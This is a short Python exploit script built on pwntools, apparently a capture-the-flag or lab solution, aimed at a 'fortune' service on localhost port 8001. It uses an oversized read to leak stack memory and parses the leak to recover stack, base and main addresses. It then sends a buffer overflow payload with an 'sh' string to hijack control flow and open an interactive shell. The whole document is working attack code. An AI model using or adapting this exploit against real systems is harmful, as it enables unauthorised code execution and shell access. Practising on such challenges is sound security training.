from pwn import *

p = remote("localhost", 8001)

p.sendline(b"2")
p.sendline(b"400")
p.sendline(b"")

p.recvuntil(b"Text: ")

leaked = p.recvuntil(b"1. Take a fortune").split(b"1. Take a fortune")[0]

current_mult = 1

leaked_addr_list = []
current_mem = []

for i in leaked :
    try :
        current_mult += 1
        current_mem.append(i)
        if current_mult > 4:
            leaked_addr_list.append("0x" + (bytes(current_mem[::-1]).hex()))
            current_mult = 1
            current_mem = []
    except IndexError :
        leaked_addr_list.append("0x" + (bytes(current_mem[::-1]).hex()))
        current_mult = 1
        current_mem = []
        break

print(leaked_addr_list[39])

stack_addr = int(leaked_addr_list[10], 16) - 100
base_addr = int(leaked_addr_list[27], 16) - 0x1496
main_addr = base_addr + 0x00001473

print("Stack address = ", hex(stack_addr))
print("Base address = ", hex(base_addr))
print("main =  ", hex(main_addr))

payload = p32(main_addr + 130) + p32(stack_addr + 8) + b"sh\x00\x00" + cyclic(144)
payload += p32(stack_addr + 4)

p.sendline(b"2")
p.sendline(b"400")
p.sendline(payload)

p.interactive()
